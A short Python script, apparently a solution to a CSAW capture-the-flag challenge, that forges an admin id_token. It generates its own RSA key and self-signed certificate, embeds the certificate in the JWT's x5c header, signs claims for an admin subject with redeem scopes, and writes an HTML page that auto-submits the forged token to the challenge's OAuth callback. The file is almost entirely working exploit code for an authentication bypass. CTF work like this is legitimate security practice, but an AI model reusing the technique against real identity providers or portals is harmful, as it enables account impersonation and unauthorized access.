import base64, json, time, datetime
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding

def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

# egen nøkkel + selfsigned sertifikat
key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "strataid.example.com")])
now = datetime.datetime.utcnow()
cert = (x509.CertificateBuilder()
    .subject_name(name).issuer_name(name)
    .public_key(key.public_key())
    .serial_number(x509.random_serial_number())
    .not_valid_before(now - datetime.timedelta(days=1))
    .not_valid_after(now + datetime.timedelta(days=365))
    .sign(key, hashes.SHA256()))
x5c = base64.b64encode(cert.public_bytes(serialization.Encoding.DER)).decode()

# header + payload
header = {"alg": "RS256", "typ": "JWT", "x5c": [x5c]}
payload = {
    "iss": "strataid.example.com",
    "sub": "admin",
    "aud": "trustdinoidc-portal",
    "scope": "openid profile freeosaurus:redeem flagosaurus:redeem",
    "exp": 17898263421,
}

h = b64u(json.dumps(header, separators=(",", ":")).encode())
p = b64u(json.dumps(payload, separators=(",", ":")).encode())
sig = key.sign(f"{h}.{p}".encode(), padding.PKCS1v15(), hashes.SHA256())
token = f"{h}.{p}.{b64u(sig)}"

print(token)
open("forged.jwt", "w").write(token)

# lager html fil
html = f"""<!doctype html>
<html>
<body>
<h3>Sender fake id_token </h3>
<form id="f" method="post" action="https://dino2auth.ctf.csaw.io/oauth/callback">
<input type="hidden" name="id_token" value="{token}">
<input type="hidden" name="state" value=":test1">
</form>
<script>document.getElementById("f").submit();</script>
</body>
</html>
"""
open("poc.html", "w").write(html)

